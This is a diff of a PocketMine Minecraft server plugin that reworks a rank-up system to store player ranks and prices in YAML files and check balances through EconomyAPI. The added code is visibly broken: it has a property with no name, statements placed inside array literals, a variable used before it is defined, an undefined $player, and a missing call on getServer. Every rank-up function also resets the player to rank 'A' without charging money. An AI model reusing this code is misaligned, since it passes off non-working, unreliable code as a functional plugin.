@@ -69,101 +69,212 @@ use onebone\economyapi\EconomyAPI;
 
 class RankUp extends PluginBase{
   
-      private $config;
+    /** @var provider */
+    private $provider;
+	
+    public $tasks = [];
+	
+    public $config;
+	
+    public $cfg;
+	
+    public $time;
+
+    public $seconds = 0;
+	
+    private $rank;
+    public $message;
+    private $;
   
       public function onEnable(){
         $this->getLogger()->info("§cRankup plugin made by esh123cookie hs been enabled");
+	      
+      	    $cfg = new Config($this->getDataFolder() . "/ranks.yml", Config::YAML);
+            $ranks = [
+      	    	$prices->setNested("no-money", "Not enough money to rank up");
+      	    	$prices->setNested("message", "You ranked up to rank");
+      	    ];
+	      
+	    $this->nomoney = $cfg->get("no-money");
+	    $this->message = $cfg->get("message");
+      	    $cfg->setNested("rank", $ranks);
+      	    $cfg->save();
+	    
+	    foreach ($this->getServer->getOnlinePlayers() as $player){
+  
+	    $rank = new Config($this->getDataFolder() . "data." . $player->getLowerCaseName() . ".yml", Config::YAML);
+	    $this->rank = $this->getRank($player, $this->getConfig()->get("rank"));
+	      
+      	    $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
+            $prices = [
+      	    	$prices->setNested("A", 0);
+      	    	$prices->setNested("B", 0);
+      	    	$prices->setNested("C", 0);
+      	    	$prices->setNested("D", 0);
+      	    	$prices->setNested("E", 0);
+      	    	$prices->setNested("F", 0);
+      	    	$prices->setNested("G", 0);
+      	    	$prices->setNested("H", 0);
+      	    	$prices->setNested("I", 0);
+      	    	$prices->setNested("J", 0);
+      	    	$prices->setNested("K", 0);
+      	    	$prices->setNested("L", 0);
+      	    	$prices->setNested("M", 0);
+      	    	$prices->setNested("N", 0);
+      	    	$prices->setNested("O", 0);
+      	    	$prices->setNested("P", 0);
+      	    	$prices->setNested("Q", 0);
+      	    	$prices->setNested("R", 0);
+      	    	$prices->setNested("S", 0);
+      	    	$prices->setNested("T", 0);
+      	    	$prices->setNested("U", 0);
+      	    	$prices->setNested("V", 0);
+      	    	$prices->setNested("W", 0);
+      	    	$prices->setNested("X", 0);
+      	    	$prices->setNested("Y", 0);
+      	    	$prices->setNested("Z", 0);
+      	    ];
+	      
+      	    $price->setNested("prices", $prices);
+      	    $price->save();
+	    }
+      }
+	
+      public function prepare(): void{
+		if(!is_dir($this->getDataFolder() . "data.")){
+			mkdir($this->getDataFolder() . "data.");
+		}
+      }
+	
+      public function registerUser(Player $player): void{
+		$config = new Config($this->getDataFolder() . "data." . $player->getLowerCaseName() . ".yml", Config::YAML);
+		if((!$config->exists("rank"))){
+			$config->setAll(["player" => $player->getName(), "rank" => "None"]);
+			$config->save();
+		}
+      }
+	
+      public function userExists(Player $player): bool{
+		$config = new Config($this->getDataFolder() . "data." . $player->getLowerCaseName() . ".yml", Config::YAML);
+		return (($config->exists("rank"))) ? true : false;
+      }
+	
+      public function getRank(Player $player): int{
+  		$config = new Config($this->getDataFolder() . "data." . $player->getLowerCaseName() . ".yml", Config::YAML);
+		return $config->get("rank");
       }
 	
 	//perms
+	
+      public function onJoin(PlayerJoinEvent $event) {
+        $player = $event->getPlayer();
+	if(!$this->userExists($player)){
+	    $this->getLogger()->info("Creating new RankUp profile");
+	    $this->registerUser($player);
+		}
+		if($event->getPlayer()->hasPlayedBefore() == false) {
+		   $rank = new Config($this->getDataFolder() . "data." . $player->getLowerCaseName() . ".yml", Config::YAML);
+		   $rank->set("rank", "A");
+		   $rank->save();
+		}
+      }
+			
+		
   
       public function onCommand(CommandSender $sender, Command $cmd, string $label, array $args): bool
       {
+      $rank = $this->getRank($player, (int) $this->getConfig()->get("level"));
 	   if($cmd->getName() == "ruabout") {
 	      if ($sender instanceof Player) {
 	      $sender->sendMessage("§7(§a!§7) Plugin made by: esh123cookie for custom plugins message me on my discord @bigbozzlmao#4035"); 
               }
               return true;
 	   }
+	   if($cmd->getName() == "mines") {
+	      if ($sender instanceof Player) {
+		  $this->mines($sender);
+              }
+              return true;
+	   }
            if($cmd->getName() == "rankup") {
 	      if ($sender instanceof Player) {
-           if($sender->hasPermission($this->getConfig()->get("permission1"))) {
-	      $sender->sendMessage($this->getConfig()->get("rankupmsg1"));
+           if($rank == "None") {
+	      $sender->sendMessage($this->message . " " . $this->rank);
               $this->Rankup($sender);
-           }elseif($sender->hasPermission($this->getConfig()->get("permission2"))) {
-	      $sender->sendMessage($this->getConfig()->get("rankupmsg2"));
+	   }elseif($rank == "B") {
+	      $sender->sendMessage($this->message . " " . $this->rank);
               $this->Rankup2($sender);
-           }elseif($sender->hasPermission($this->getConfig()->get("permission3"))) {
-	      $sender->sendMessage($this->getConfig()->get("rankupmsg3"));
+	   }elseif($rank == "C") {
+	      $sender->sendMessage($this->message . " " . $this->rank);
               $this->Rankup3($sender);
-           }elseif($sender->hasPermission($this->getConfig()->get("permission4"))) {
-	      $sender->sendMessage($this->getConfig()->get("rankupmsg4"));
+	   }elseif($rank == "D") {
+	      $sender->sendMessage($this->message . " " . $this->rank);
               $this->Rankup4($sender);
-           }elseif($sender->hasPermission($this->getConfig()->get("permission5"))) {
-	      $sender->sendMessage($this->getConfig()->get("rankupmsg5"));
+	   }elseif($rank == "E") {
+	      $sender->sendMessage($this->message . " " . $this->rank);
               $this->Rankup5($sender);
-           }elseif($sender->hasPermission($this->getConfig()->get("permission6"))) {
-	      $sender->sendMessage($this->getConfig()->get("rankupmsg6"));
+	   }elseif($rank == "F") {
+	      $sender->sendMessage($this->message . " " . $this->rank);
               $this->Rankup6($sender);
-           }elseif($sender->hasPermission($this->getConfig()->get("permission7"))) {
-	      $sender->sendMessage($this->getConfig()->get("rankupmsg7"));
+	   }elseif($rank == "G") {
+	      $sender->sendMessage($this->message . " " . $this->rank);
               $this->Rankup7($sender);
-           }elseif($sender->hasPermission($this->getConfig()->get("permission8"))) {
-	      $sender->sendMessage($this->getConfig()->get("rankupmsg8"));
+	   }elseif($rank == "H") {
+	      $sender->sendMessage($this->message . " " . $this->rank);
               $this->Rankup8($sender);
-           }elseif($sender->hasPermission($this->getConfig()->get("permission9"))) {
-	      $sender->sendMessage($this->getConfig()->get("rankupmsg9"));
+	   }elseif($rank == "I") {
+	      $sender->sendMessage($this->message . " " . $this->rank);
               $this->Rankup9($sender);
-           }elseif($sender->hasPermission($this->getConfig()->get("permission10"))) {
-	      $sender->sendMessage($this->getConfig()->get("rankupmsg10"));
+	   }elseif($rank == "J") {
+	      $sender->sendMessage($this->message . " " . $this->rank);
               $this->Rankup10($sender);
-           }elseif($sender->hasPermission($this->getConfig()->get("permission11"))) {
-	      $sender->sendMessage($this->getConfig()->get("rankupmsg11"));
+	   }elseif($rank == "K") {
+	      $sender->sendMessage($this->message . " " . $this->rank);
               $this->Rankup11($sender);
-           }elseif($sender->hasPermission($this->getConfig()->get("permission12"))) {
-	      $sender->sendMessage($this->getConfig()->get("rankupmsg12"));
+	   }elseif($rank == "L") {
+	      $sender->sendMessage($this->message . " " . $this->rank);
               $this->Rankup12($sender);
-           }elseif($sender->hasPermission($this->getConfig()->get("permission13"))) {
-	      $sender->sendMessage($this->getConfig()->get("rankupmsg13"));
+	   }elseif($rank == "M") {
+	      $sender->sendMessage($this->message . " " . $this->rank);
               $this->Rankup13($sender);
-           }elseif($sender->hasPermission($this->getConfig()->get("permission14"))) {
-	      $sender->sendMessage($this->getConfig()->get("rankupmsg14"));
+	   }elseif($rank == "N") {
+	      $sender->sendMessage($this->message . " " . $this->rank);
               $this->Rankup14($sender);
-           }elseif($sender->hasPermission($this->getConfig()->get("permission15"))) {
-	      $sender->sendMessage($this->getConfig()->get("rankupmsg15"));
+	   }elseif($rank == "O") {
+	      $sender->sendMessage($this->message . " " . $this->rank);
               $this->Rankup15($sender);
-           }elseif($sender->hasPermission($this->getConfig()->get("permission16"))) {
-	      $sender->sendMessage($this->getConfig()->get("rankupmsg16"));
+	   }elseif($rank == "P") {
+	      $sender->sendMessage($this->message . " " . $this->rank);
               $this->Rankup16($sender);
-           }elseif($sender->hasPermission($this->getConfig()->get("permission17"))) {
-	      $sender->sendMessage($this->getConfig()->get("rankupmsg17"));
+	   }elseif($rank == "Q") {
+	      $sender->sendMessage($this->message . " " . $this->rank);
               $this->Rankup17($sender);
-           }elseif($sender->hasPermission($this->getConfig()->get("permission18"))) {
-	      $sender->sendMessage($this->getConfig()->get("rankupmsg18"));
+	   }elseif($rank == "R") {
+	      $sender->sendMessage($this->message . " " . $this->rank);
               $this->Rankup18($sender);
-           }elseif($sender->hasPermission($this->getConfig()->get("permission19"))) {
-	      $sender->sendMessage($this->getConfig()->get("rankupmsg19"));
+	   }elseif($rank == "S") {
+	      $sender->sendMessage($this->message . " " . $this->rank);
               $this->Rankup19($sender);
-           }elseif($sender->hasPermission($this->getConfig()->get("permission20"))) {
-	      $sender->sendMessage($this->getConfig()->get("rankupmsg20"));
+	   }elseif($rank == "T") {
+	      $sender->sendMessage($this->message . " " . $this->rank);
               $this->Rankup20($sender);
-           }elseif($sender->hasPermission($this->getConfig()->get("permission21"))) {
-	      $sender->sendMessage($this->getConfig()->get("rankupmsg21"));
+	   }elseif($rank == "U") {
+	      $sender->sendMessage($this->message . " " . $this->rank);
               $this->Rankup20($sender);
-           }elseif($sender->hasPermission($this->getConfig()->get("permission22"))) {
-	      $sender->sendMessage($this->getConfig()->get("rankupmsg22"));
+	   }elseif($rank == "V") {
+	      $sender->sendMessage($this->message . " " . $this->rank);
               $this->Rankup22($sender);
-           }elseif($sender->hasPermission($this->getConfig()->get("permission23"))) {
-	      $sender->sendMessage($this->getConfig()->get("rankupmsg23"));
+	   }elseif($rank == "W") {
+	      $sender->sendMessage($this->message . " " . $this->rank);
               $this->Rankup23($sender);
-           }elseif($sender->hasPermission($this->getConfig()->get("permission24"))) {
-	      $sender->sendMessage($this->getConfig()->get("rankupmsg24"));
+	   }elseif($rank == "X") {
+	      $sender->sendMessage($this->message . " " . $this->rank);
               $this->Rankup24($sender);
-           }elseif($sender->hasPermission($this->getConfig()->get("permission25"))) {
-	      $sender->sendMessage($this->getConfig()->get("rankupmsg25"));
+	   }elseif($rank == "Y") {
+	      $sender->sendMessage($this->message . " " . $this->rank);
               $this->Rankup25($sender);
-           }elseif($sender->hasPermission($this->getConfig()->get("permission26"))) {
-	      $sender->sendMessage($this->getConfig()->get("rankupmsg26"));
+	   }elseif($rank == "Z") {
+	      $sender->sendMessage($this->message . " " . $this->rank);
               $this->Rankup26($sender);
               }
 	      }
@@ -172,404 +283,411 @@ class RankUp extends PluginBase{
       }
 	
       // Rankup part
+      /* if someone does fork thats how you add more ranks       
+	        $config = new Config($this->getDataFolder() . "data." . $player->getLowerCaseName() . ".yml", Config::YAML);
+		$config->set("rank", $this->rank);
+		$config->save();
+      */
   
       public function Rankup($sender) {
-            if(!$sender instanceof Player) return true;
-	      $p = $sender->getName();
-              $amount = $this->getConfig()->get("price1");
-             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
-                 $cmd = $this->getConfig()->get("cmd");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd);
-                 $cmd2 = $this->getConfig()->get("cmd2");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd2);
+            if($sender instanceof Player) {
+	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
+	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
+	      $cost = $price->get($this->rank);
+             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
+		$rank->set("rank", "A");
+		$rank->save();
               }else{ 
-                 $sender->sendMessage($this->getConfig()->get("rankmsg1"));
+                 $sender->sendMessage($this->nomoney);
 		}
+	    }
       return true;
       }
   
       public function Rankup2($sender) {
-            if(!$sender instanceof Player) return true;
-	      $p = $sender->getName();
-              $amount = $this->getConfig()->get("price2");
-             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
-                 $cmd3 = $this->getConfig()->get("cmd3");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd3);
-                 $cmd4 = $this->getConfig()->get("cmd4");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd4);
+            if($sender instanceof Player) {
+	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
+	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
+	      $cost = $price->get($this->rank);
+             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
+		$rank->set("rank", "A");
+		$rank->save();
               }else{ 
-                 $sender->sendMessage($this->getConfig()->get("rankmsg2"));
+                 $sender->sendMessage($this->nomoney);
 		}
+	    }
       return true;
       }
   
       public function Rankup3($sender) {
-            if(!$sender instanceof Player) return true;
-	      $p = $sender->getName();
-              $amount = $this->getConfig()->get("price3");
-             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
-                 $cmd5 = $this->getConfig()->get("cmd5");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd5);
-                 $cmd6 = $this->getConfig()->get("cmd6");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd6);
+            if($sender instanceof Player) {
+	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
+	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
+	      $cost = $price->get($this->rank);
+             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
+		$rank->set("rank", "A");
+		$rank->save();
               }else{ 
-                 $sender->sendMessage($this->getConfig()->get("rankmsg3"));
+                 $sender->sendMessage($this->nomoney);
 		}
+	    }
       return true;
       }
   
       public function Rankup4($sender) {
-            if(!$sender instanceof Player) return true;
-	      $p = $sender->getName();
-              $amount = $this->getConfig()->get("price4");
-             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
-                 $cmd7 = $this->getConfig()->get("cmd7");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd7);
-                 $cmd8 = $this->getConfig()->get("cmd8");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd8);
+            if($sender instanceof Player) {
+	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
+	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
+	      $cost = $price->get($this->rank);
+             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
+		$rank->set("rank", "A");
+		$rank->save();
               }else{ 
-                 $sender->sendMessage($this->getConfig()->get("rankmsg4"));
+                 $sender->sendMessage($this->nomoney);
 		}
+	    }
       return true;
       }
   
       public function Rankup5($sender) {
-            if(!$sender instanceof Player) return true;
-	      $p = $sender->getName();
-              $amount = $this->getConfig()->get("price5");
-             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
-                 $cmd9 = $this->getConfig()->get("cmd9");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd9);
-                 $cmd10 = $this->getConfig()->get("cmd10");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd10);
+            if($sender instanceof Player) {
+	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
+	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
+	      $cost = $price->get($this->rank);
+             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
+		$rank->set("rank", "A");
+		$rank->save();
               }else{ 
-                 $sender->sendMessage($this->getConfig()->get("rankmsg5"));
+                 $sender->sendMessage($this->nomoney);
 		}
+	    }
       return true;
       }
 
       public function Rankup6($sender) {
-            if(!$sender instanceof Player) return true;
-	      $p = $sender->getName();
-              $amount = $this->getConfig()->get("price6");
-             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
-                 $cmd11 = $this->getConfig()->get("cmd11");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd11);
-                 $cmd12 = $this->getConfig()->get("cmd12");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd12);
+            if($sender instanceof Player) {
+	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
+	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
+	      $cost = $price->get($this->rank);
+             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
+		$rank->set("rank", "A");
+		$rank->save();
               }else{ 
-                 $sender->sendMessage($this->getConfig()->get("rankmsg6"));
+                 $sender->sendMessage($this->nomoney);
 		}
+	    }
       return true;
       }
   
       public function Rankup7($sender) {
-            if(!$sender instanceof Player) return true;
-	      $p = $sender->getName();
-              $amount = $this->getConfig()->get("price7");
-             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
-                 $cmd13 = $this->getConfig()->get("cmd13");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd13);
-                 $cmd14 = $this->getConfig()->get("cmd14");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd14);
+            if($sender instanceof Player) {
+	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
+	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
+	      $cost = $price->get($this->rank);
+             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
+		$rank->set("rank", "A");
+		$rank->save();
               }else{ 
-                 $sender->sendMessage($this->getConfig()->get("rankmsg7"));
+                 $sender->sendMessage($this->nomoney);
 		}
+	    }
       return true;
       }
 
       public function Rankup8($sender) {
-            if(!$sender instanceof Player) return true;
-	      $p = $sender->getName();
-              $amount = $this->getConfig()->get("price8");
-             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
-                 $cmd15 = $this->getConfig()->get("cmd15");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd15);
-                 $cmd16 = $this->getConfig()->get("cmd16");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd16);
+            if($sender instanceof Player) {
+	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
+	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
+	      $cost = $price->get($this->rank);
+             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
+		$rank->set("rank", "A");
+		$rank->save();
               }else{ 
-                 $sender->sendMessage($this->getConfig()->get("rankmsg8"));
+                 $sender->sendMessage($this->nomoney);
 		}
+	    }
       return true;
       }
   
       public function Rankup9($sender) {
-            if(!$sender instanceof Player) return true;
-	      $p = $sender->getName();
-              $amount = $this->getConfig()->get("price9");
-             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
-                 $cmd17 = $this->getConfig()->get("cmd17");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd17);
-                 $cmd18 = $this->getConfig()->get("cmd18");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd18);
+            if($sender instanceof Player) {
+	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
+	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
+	      $cost = $price->get($this->rank);
+             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
+		$rank->set("rank", "A");
+		$rank->save();
               }else{ 
-                 $sender->sendMessage($this->getConfig()->get("rankmsg9"));
+                 $sender->sendMessage($this->nomoney);
 		}
+	    }
       return true;
       }
 
       public function Rankup10($sender) {
-            if(!$sender instanceof Player) return true;
-	      $p = $sender->getName();
-              $amount = $this->getConfig()->get("price10");
-             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
-                 $cmd19 = $this->getConfig()->get("cmd19");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd19);
-                 $cmd20 = $this->getConfig()->get("cmd20");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd20);
+            if($sender instanceof Player) {
+	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
+	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
+	      $cost = $price->get($this->rank);
+             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
+		$rank->set("rank", "A");
+		$rank->save();
               }else{ 
-                 $sender->sendMessage($this->getConfig()->get("rankmsg10"));
+                 $sender->sendMessage($this->nomoney);
 		}
+	    }
       return true;
       }
 
       public function Rankup11($sender) {
-            if(!$sender instanceof Player) return true;
-	      $p = $sender->getName();
-              $amount = $this->getConfig()->get("price11");
-             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
-                 $cmd21 = $this->getConfig()->get("cmd21");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd21);
-                 $cmd22 = $this->getConfig()->get("cmd22");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd22);
+            if($sender instanceof Player) {
+	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
+	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
+	      $cost = $price->get($this->rank);
+             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
+		$rank->set("rank", "A");
+		$rank->save();
               }else{ 
-                 $sender->sendMessage($this->getConfig()->get("rankmsg11"));
+                 $sender->sendMessage($this->nomoney);
 		}
+	    }
       return true;
       }
   
       public function Rankup12($sender) {
-            if(!$sender instanceof Player) return true;
-	      $p = $sender->getName();
-              $amount = $this->getConfig()->get("price12");
-             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
-                 $cmd23 = $this->getConfig()->get("cmd23");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd23);
-                 $cmd24 = $this->getConfig()->get("cmd24");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd24);
+            if($sender instanceof Player) {
+	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
+	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
+	      $cost = $price->get($this->rank);
+             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
+		$rank->set("rank", "A");
+		$rank->save();
               }else{ 
-                 $sender->sendMessage($this->getConfig()->get("rankmsg12"));
+                 $sender->sendMessage($this->nomoney);
 		}
+	    }
       return true;
       }
   
       public function Rankup13($sender) {
-            if(!$sender instanceof Player) return true;
-	      $p = $sender->getName();
-              $amount = $this->getConfig()->get("price13");
-             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
-                 $cmd25 = $this->getConfig()->get("cmd25");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd25);
-                 $cmd26 = $this->getConfig()->get("cmd26");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd26);
+            if($sender instanceof Player) {
+	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
+	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
+	      $cost = $price->get($this->rank);
+             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
+		$rank->set("rank", "A");
+		$rank->save();
               }else{ 
-                 $sender->sendMessage($this->getConfig()->get("rankmsg13"));
+                 $sender->sendMessage($this->nomoney);
 		}
+	    }
       return true;
       }
   
       public function Rankup14($sender) {
-            if(!$sender instanceof Player) return true;
-	      $p = $sender->getName();
-              $amount = $this->getConfig()->get("price14");
-             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
-                 $cmd27 = $this->getConfig()->get("cmd27");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd27);
-                 $cmd28 = $this->getConfig()->get("cmd28");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd28);
+            if($sender instanceof Player) {
+	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
+	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
+	      $cost = $price->get($this->rank);
+             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
+		$rank->set("rank", "A");
+		$rank->save();
               }else{ 
-                 $sender->sendMessage($this->getConfig()->get("rankmsg14"));
+                 $sender->sendMessage($this->nomoney);
 		}
+	    }
       return true;
       }
   
       public function Rankup15($sender) {
-            if(!$sender instanceof Player) return true;
-	      $p = $sender->getName();
-              $amount = $this->getConfig()->get("price15");
-             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
-                 $cmd29 = $this->getConfig()->get("cmd29");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd29);
-                 $cmd30 = $this->getConfig()->get("cmd30");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd30);
+            if($sender instanceof Player) {
+	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
+	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
+	      $cost = $price->get($this->rank);
+             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
+		$rank->set("rank", "A");
+		$rank->save();
               }else{ 
-                 $sender->sendMessage($this->getConfig()->get("rankmsg15"));
+                 $sender->sendMessage($this->nomoney);
 		}
+	    }
       return true;
       }
   
       public function Rankup16($sender) {
-            if(!$sender instanceof Player) return true;
-	      $p = $sender->getName();
-              $amount = $this->getConfig()->get("price16");
-             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
-                 $cmd31 = $this->getConfig()->get("cmd31");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd31);
-                 $cmd32 = $this->getConfig()->get("cmd32");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd32);
+            if($sender instanceof Player) {
+	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
+	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
+	      $cost = $price->get($this->rank);
+             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
+		$rank->set("rank", "A");
+		$rank->save();
               }else{ 
-                 $sender->sendMessage($this->getConfig()->get("rankmsg16"));
+                 $sender->sendMessage($this->nomoney);
 		}
+	    }
       return true;
       }
 
       public function Rankup17($sender) {
-            if(!$sender instanceof Player) return true;
-	      $p = $sender->getName();
-              $amount = $this->getConfig()->get("price17");
-             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
-                 $cmd33 = $this->getConfig()->get("cmd33");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd33);
-                 $cmd34 = $this->getConfig()->get("cmd34");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd34);
+            if($sender instanceof Player) {
+	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
+	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
+	      $cost = $price->get($this->rank);
+             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
+		$rank->set("rank", "A");
+		$rank->save();
               }else{ 
-                 $sender->sendMessage($this->getConfig()->get("rankmsg17"));
+                 $sender->sendMessage($this->nomoney);
 		}
+	    }
       return true;
       }
   
       public function Rankup18($sender) {
